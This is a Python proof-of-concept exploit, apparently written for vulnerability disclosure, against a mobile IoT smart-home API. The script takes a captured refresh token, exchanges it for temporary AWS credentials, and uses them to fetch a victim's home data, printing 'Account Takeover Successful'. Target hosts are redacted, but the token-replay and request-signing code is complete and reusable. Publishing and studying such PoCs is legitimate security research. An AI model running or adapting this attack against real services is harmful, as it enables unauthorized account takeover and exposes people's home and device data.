"""
PoC: Mobile-IoT Control API Token Exchange & Data Access (Account Takeover Vulnerability) - CRITICAL
Author: Ferdi Gül
GitHub: https://github.com/FerdiGul
LinkedIn: https://www.linkedin.com/in/gulferdi/
Email: 0xfrd1gul@gmail.com

This PoC demonstrates how to use a captured Mobile App refresh token to
obtain temporary AWS credentials and access user home data from IoT Device API.

The sections enclosed in "<>" have been created for demonstration purposes to
prevent the disclosure of the target company's IoT device and server information.

🔐 Vulnerability Classification (CWE):
- CWE-284: Improper Access Control
- CWE-287: Improper Authentication
- CWE-522: Insufficiently Protected Credentials
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Educational use only. Do not use without proper authorization.
"""


import requests
import time
from requests_aws4auth import AWS4Auth

# Captured refreshToken (JWT)
REFRESH_TOKEN = "<REFRESH_TOKEN>"

AUTH_ENDPOINT = "https://api.<companyiot.com>/auth/refresh-token"
DATA_ENDPOINT = "https://smarthome.<companyiot.com>/my-homes"

common_headers = {
    "Content-Type": "application/json",
    "User-Agent": "aws-sdk-iOS/2.40.1",
    "X-<Comp>-Env": "LIVE",
    "X-<Comp>-Build-Meta": "iOS-18.3.1-PH-PROD-STD-3.1.29-P-<Mobile-IoTApp>"
}

for i in range(2):
    print(f"\n🔄 Iteration {i+1}")

    payload = {
        "refreshToken": REFRESH_TOKEN,
        "devicePlatform": "iOS"
    }

    auth_resp = requests.post(AUTH_ENDPOINT, json=payload, headers=common_headers)
    if auth_resp.status_code != 200:
        print(f"❌ Refresh token failed: {auth_resp.status_code}")
        continue

    creds = auth_resp.json()["data"]["credentials"]
    access_key = creds["accessKey"]
    secret_key = creds["secretKey"]
    session_token = creds["sessionToken"]

    aws_auth = AWS4Auth(access_key, secret_key, "eu-west-1", "execute-api", session_token=session_token)

    api_resp = requests.get(DATA_ENDPOINT, auth=aws_auth, headers=common_headers)

    if api_resp.status_code == 200:
        print(f"✅ Account Takeover Successful! Response:\n{api_resp.text[:]}...")
    else:
        print(f"❌ API access failed: {api_resp.status_code}")

    time.sleep(1)

print("\nTest completed.")
